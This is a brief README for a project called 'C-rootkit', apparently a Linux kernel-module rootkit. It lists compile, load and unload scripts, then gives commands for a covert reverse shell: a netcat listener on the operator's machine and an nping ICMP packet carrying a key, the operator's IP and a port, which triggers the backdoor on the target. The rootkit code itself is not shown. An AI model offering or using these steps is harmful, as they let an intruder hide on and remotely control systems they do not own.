C-rootkit

##to compile:
make

##to load the kernel module:
./load_module.sh

##to unload the kernel module:
./cleanup.sh

##to connect to reverse shell:
on your machine: nc -lvvnp [port]
sudo nping --icmp -c 1 -dest-ip [destination ip] --data-string '[KEY] [your ip] [port]'

